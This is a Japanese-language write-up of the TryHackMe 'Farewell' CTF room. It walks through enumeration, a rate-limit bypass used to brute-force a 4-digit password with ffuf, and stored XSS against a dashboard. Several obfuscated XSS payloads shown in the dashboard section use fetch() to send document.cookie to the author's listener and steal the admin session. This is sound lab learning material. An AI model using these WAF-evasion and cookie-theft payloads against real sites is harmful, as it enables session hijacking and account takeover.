# Farewell CTF

https://tryhackme.com/room/farewell

## Enumeration

```shell
TARGET=10.201.61.153
sudo bash -c "echo $TARGET   farewell.thm >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -vv -sS -p- $TARGET

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
```

```sh
sudo nmap -sS -sV -p22,80 $TARGET

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
```

SSH, HTTP

### nikto

```sh
root@ip-10-201-76-20:~# nikto -p 80 -T 1 2 3 -h $TARGET
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.201.61.153
+ Target Hostname:    farewell.thm
+ Target Port:        80
+ Start Time:         2025-11-15 00:47:59 (GMT0)
---------------------------------------------------------------------------
+ Server: Apache/2.4.58 (Ubuntu)
+ Cookie PHPSESSID created without the httponly flag
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
+ OSVDB-3092: /admin.php: This might be interesting...
+ 1707 items checked: 0 error(s) and 4 item(s) reported on remote host
+ End Time:           2025-11-15 00:48:01 (GMT0) (2 seconds)
--------------------------------------------------------------------------
```

`Cookie PHPSESSID created without the httponly flag` -> XSSを念頭に置く。

### ディレクトリ列挙

dirb

```sh
root@ip-10-201-76-20:~# dirb http://farewell.thm

---- Scanning URL: http://farewell.thm/ ----
+ http://farewell.thm/admin.php (CODE:200|SIZE:2343)                                                      
+ http://farewell.thm/index.php (CODE:200|SIZE:5246)                                                      
+ http://farewell.thm/info.php (CODE:200|SIZE:87649)                                                      
==> DIRECTORY: http://farewell.thm/javascript/                                                            
+ http://farewell.thm/server-status (CODE:403|SIZE:780)                                                   
                                                                                                          
---- Entering directory: http://farewell.thm/javascript/ ----
==> DIRECTORY: http://farewell.thm/javascript/jquery/                                                     
                                                                                                          
---- Entering directory: http://farewell.thm/javascript/jquery/ ----
+ http://farewell.thm/javascript/jquery/jquery (CODE:200|SIZE:289782)                                     
                                                                                                          
-----------------
```

dirsearch

```sh
[00:53:50] 200 -    1KB - /admin.php
[00:53:59] 405 -   30B  - /auth.php
[00:54:06] 302 -    0B  - /dashboard.php  ->  /
[00:54:16] 200 -   24KB - /info.php
[00:54:17] 301 -  317B  - /javascript  ->  http://farewell.thm/javascript/
[00:54:21] 302 -    0B  - /logout.php  ->  index.php
[00:54:42] 200 -    1KB - /status.php
```

- admin.php はパスワードのみ入力する画面。
- auth.php は、`{"error":"method_not_allowed"}` が返る。
- info.php は、phpinfo。
- status.php は、環境リセット用として明記されている。

## ログイン画面

トップページにアクセスするとログイン画面が表示された。

3人のユーザー名が表示されている。

```html
<div class="ticker" id="ticker">
  <!-- duplicated items for continuous scroll -->
  <div class="tick-item">adam posted a message - 3 hrs ago</div>
  <div class="tick-item">deliver11 posted a message - 4 hrs ago</div>
  <div class="tick-item">nora posted a message - 1 day ago</div>
</div>
```

ユーザー名adamとして適当にパスワードを送ると、`Server hint: Invalid password against the user` と表示されるので、３人以外にもユーザー名を取得できる可能性がある。

### SQLi

単純なマニュアルテストと sqlmap を実行したが、脆弱性は見つからなかった。

### パスワード

パスワードブルートフォースをかけると、すぐにWAFが反応して403を返すようになる。

有効なユーザー名で適当にパスワードを送ると、応答にパスワードヒントが含まれていることに気づいた。

adam

```json
{"error":"auth_failed","user":{"name":"adam","last_password_change":"2025-10-21 09:12:00","password_hint":"favorite pet + 2"}}
```

deliver11

```json
{"error":"auth_failed","user":{"name":"deliver11","last_password_change":"2025-09-10 11:00:00","password_hint":"Capital of Japan followed by 4 digits"}}
```

nora

```json
{"error":"auth_failed","user":{"name":"nora","last_password_change":"2025-08-01 13:45:00","password_hint":"lucky number 789"}}
```

adam と nora は手作業でいろいろ試してみたが、意図が分からなかった。deliver11 が、4桁の整数で特定できるので便利と思われるが、レート制限を回避する方法が必要。

ダミーのパラメータを付け加えることでレート制限を回避できることを確認。

```sh
$ ffuf -u 'http://farewell.thm/auth.php?n=FUZZ' -X POST -d 'username=adam&password=FUZZ' -c -w /usr/share/wordlists/fasttrack.txt -fr "auth_failed"
```

4桁のリストを作る。

```sh
$ seq -w 0000 9999 > nnnn.txt
```

大文字小文字とヘッダーを試行錯誤して成功！

```sh
$ ffuf -u 'http://farewell.thm/auth.php?n=FUZZ' -X POST -d 'username=deliver11&password=TokyoFUZZ' -c -w ./nnnn.txt -fr "auth_failed" -H "Content-Type: application/x-www-form-urlencoded"

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://farewell.thm/auth.php?n=FUZZ
 :: Wordlist         : FUZZ: /home/kali/ctf/farewell/nnnn.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : username=deliver11&password=TokyoFUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Regexp: auth_failed
________________________________________________

[REDACTED]                    [Status: 200, Size: 45, Words: 1, Lines: 1, Duration: 330ms]
:: Progress: [10000/10000] :: Job [1/1] :: 132 req/sec :: Duration: [0:01:24] :: Errors: 0 ::
```

ログインしたらユーザーフラグが表示された。

## dashboard

### 1 URL

単に http URL を入力しただけでは、リクエストは来なかった。

### 2 script

単純な `<script>alert('hello')</script>` を入力したら、WAFにBANされた。script に大文字小文字混ぜても同様。

### 3 img

imgタグを入力したらリクエストが来た。

```
<img src="http://10.11.146.32:8000/test.jpg">
```

```sh
$ python -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.201.120.193 - - [14/Nov/2025 22:10:50] code 404, message File not found
10.201.120.193 - - [14/Nov/2025 22:10:50] "GET /test.jpg HTTP/1.1" 404 -
10.201.120.193 - - [14/Nov/2025 22:10:51] code 404, message File not found
10.201.120.193 - - [14/Nov/2025 22:10:51] "GET /test.jpg HTTP/1.1" 404 -
10.201.120.193 - - [14/Nov/2025 22:10:57] code 404, message File not found
10.201.120.193 - - [14/Nov/2025 22:10:57] "GET /test.jpg HTTP/1.1" 404 -
```

いろいろ試す。

```html
# BANにならない
<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>

<iframe src="javascript:alert(`xss`)">

# BANになる
<IMG SRC=/ onerror="alert(document.cookie)"></img>

<IMG SRC=/ onerror="alert('cookie')"></img>

<img src="http://10.11.146.32:8000/' + DocuMent.cOoKie + '">

<IMG SRC=/ onerror="fetch('http://10.11.146.32:8000?cookie=' + btoa(document.cookie) )"></img>

<IMG SRC=/ onerror="fetch('http://10.11.146.32:8000?cookie=' + btoa(docu&#x09;ment.co&#x09;okie) )"></img>

<IMG SRC=/ onerror="fetch('http://10.11.146.32:8000?p')"></img>

<IMG SRC=/ onerror="alert('fetch')"></img>
```

長らく試行錯誤した末、このペイロードにたどり着いた。

```html
<IMG SRC=/ onerror="eval('fe'+'tch(`http://10.11.146.32:8000/${doc'+'ument.c'+'ookie}`)')"></img>
```

adminのセッションIDが送信されてきた。

```sh
$ python -m http.server 
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.201.29.25 - - [15/Nov/2025 19:19:29] code 404, message File not found
10.201.29.25 - - [15/Nov/2025 19:19:29] "GET /PHPSESSID=[REDACTED] HTTP/1.1" 404 -
10.201.29.25 - - [15/Nov/2025 19:19:35] code 404, message File not found
10.201.29.25 - - [15/Nov/2025 19:19:35] "GET /PHPSESSID=[REDACTED] HTTP/1.1" 404 -
```

/admin.php にアクセスすると、フラグが表示された。

## 振り返り

- 攻撃のロジック自体はごく単純だが、WAFバイパスはあまり慣れていないので、やりがいがあって楽しかった。
- 今回は試行錯誤で何十回もBANを発生させてしまった。実務を想定するなら手当たり次第に試すより先によく考えることが重要だったと反省。
- WAFリセット用のスイッチが用意されていたのが親切設計で有難かった。

## Tags

#tags:レート制限回避 #tags:XSS #tags:XSSフィルターバイパス
